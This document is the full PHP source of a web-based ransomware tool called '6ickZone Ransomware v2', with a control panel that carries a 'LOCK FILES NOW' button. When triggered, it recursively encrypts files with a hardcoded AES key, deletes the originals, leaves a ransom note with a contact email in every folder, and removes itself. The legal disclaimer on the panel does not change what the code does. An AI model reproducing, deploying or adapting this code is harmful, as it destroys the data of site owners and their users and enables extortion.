<?php
// 6ickZone Ransomware v2 - Obfuscated Light
//Copyright 6ickZone - 6ickWhispers@gmail.com//ganti cr ga bikin kau pro asu
set_time_limit(0);
error_reporting(0);

// --- Configuration ---
$k = "scarletdablackrose";
$e = ".6ickZone";
$n = "!!!DECRYPT_ME!!!.html";

$x = [
    basename(__FILE__),
    'decrypt.php',
    $n,
    '.htaccess',
    '.user.ini',
    'web.config',
    'php.ini',
    'index.php',
    'error_log',
    'access_log',
    'logs',
    '.git',
    '.vscode',
    'vendor',
    'node_modules',
    'composer.json',
    'package.json',
];

$t = [
    'txt','doc','docx','xls','xlsx','ppt','pptx','pdf',
    'jpg','jpeg','png','gif','mp3','mp4','avi','mov',
    'zip','rar','7z','sql','db','mdb','accdb','psd',
    'ai','html','svg','php','js','css','json','xml','csv',
];

$c = 0;

function z($f, $k, $e) {
    global $c;
    $d = @file_get_contents($f);
    if ($d === false) return false;
    if (substr($d, 0, 9) === "6ickZone:") return false;

    $i = openssl_random_pseudo_bytes(16);
    $ed = openssl_encrypt($d, 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $i);
    if ($ed === false) return false;

    $fd = "6ickZone:" . base64_encode($i . $ed);
    if (file_put_contents($f . $e, $fd) === false) return false;
    if (!unlink($f)) return false;

    $c++;
    return true;
}

function y($d, $k, $n) {
    $m = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>!!! FILES ENCRYPTED !!!</title><style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;text-align:center;padding:50px;}h1{color:#f00;}p{margin:20px 0;}code{background:#333;padding:2px 5px;border-radius:3px;}.key-info{border:1px solid #0f0;padding:15px;display:inline-block;margin-top:30px;}</style></head><body><h1>!!! ALL YOUR FILES HAVE BEEN ENCRYPTED BY 6ickZone RANSOMWARE !!!</h1><p>Your important documents, photos, databases, and other files are now inaccessible.</p><p>To restore your data, you need the decryption key.</p><div class='key-info'><p>Your Decryption Key:</p>????<strong>LoL.</strong></p></div><p>Contact us at 6ickwhispers@gmail.com for further instructions.</p><p>Warning: Attempting to decrypt without the correct key may corrupt your files permanently.</p></body></html>";
    file_put_contents($d . DIRECTORY_SEPARATOR . $n, $m);
}

function x($d, $k, $x, $t, $e, $n) {
    global $c;
    y($d, $k, $n);

    $l = scandir($d);
    foreach ($l as $i) {
        if ($i === '.' || $i === '..') continue;
        $p = $d . DIRECTORY_SEPARATOR . $i;
        if (in_array($i, $x)) continue;

        if (is_dir($p)) {
            x($p, $k, $x, $t, $e, $n);
        } elseif (is_file($p)) {
            if (pathinfo($p, PATHINFO_EXTENSION) === trim($e, '.')) continue;
            if (!empty($t)) {
                $fx = pathinfo($p, PATHINFO_EXTENSION);
                if (!in_array($fx, $t)) continue;
            }
            z($p, $k, $e);
        }
    }
}

// --- Execution ---
$run = false;
if (isset($_POST['lock'])) {
    $run = true;
    x(__DIR__, $k, $x, $t, $e, $n);

    //BYEBYE.txt
    file_put_contents(__DIR__ . '/BYEBYE.txt', "All files have been encrypted.\n- 6ickZone was here.\nGoodbye.");

    // die
    register_shutdown_function(function() {
        @unlink(__FILE__);
    });
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
        html, body { margin: 0; padding: 0; height: 100%; font-family: monospace;
            background: url('https://i.imgur.com/lHnsQI3.jpeg') no-repeat center center fixed;
            background-size: cover; color: #ffeb3b; }
        h1 { color: #f44336; margin-top: 0; text-shadow: 2px 2px 4px #000; }
        button { background: #9b59b6; border: none; padding: 12px 24px; color: #fff;
            font-size: 14px; cursor: pointer; border-radius: 4px; margin-top: 10px;
            transition: background 0.3s ease; }
        button:hover { background: #8e44ad; }
        .warning { color: #ffeb3b; font-weight: bold; margin-bottom: 20px; }
        code { color: #ffeb3b; }
        .footer { margin-top: 50px; font-size: 14px; color: #aaa; text-align: center; }
        .container { padding: 100px 20px 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h1>6ickZone Ransomware</h1>
        <p class="warning">
            Illegal Usage:<br />
            Using ransomware tools without explicit authorization is illegal and considered a cybercrime.<br />
            Use at your own risk!<br />
            The creator holds no responsibility for any consequences arising from misuse.
        </p>

        <?php if (!$run): ?>
            <p>Auto scan & encrypt all target files in this directory and its subfolders.</p>
            <form method="post">
                <button type="submit" name="lock">LOCK FILES NOW</button>
            </form>
        <?php else: ?>
            <p>total encrypted files: <strong><?php echo $c; ?></strong></p>
            <p>Encrypted files now have the extension <code><?php echo htmlspecialchars($e); ?></code>.</p>
            <p>Check each folder to find the file <code><?php echo htmlspecialchars($n); ?></code>.</p>
            <p>Key for Decryption:</p>
            <code><?php echo htmlspecialchars($k); ?></code>
        <?php endif; ?>
        <div class="footer">by Nyx6st - 6ickZone</div>
    </div>
</body>
</html>
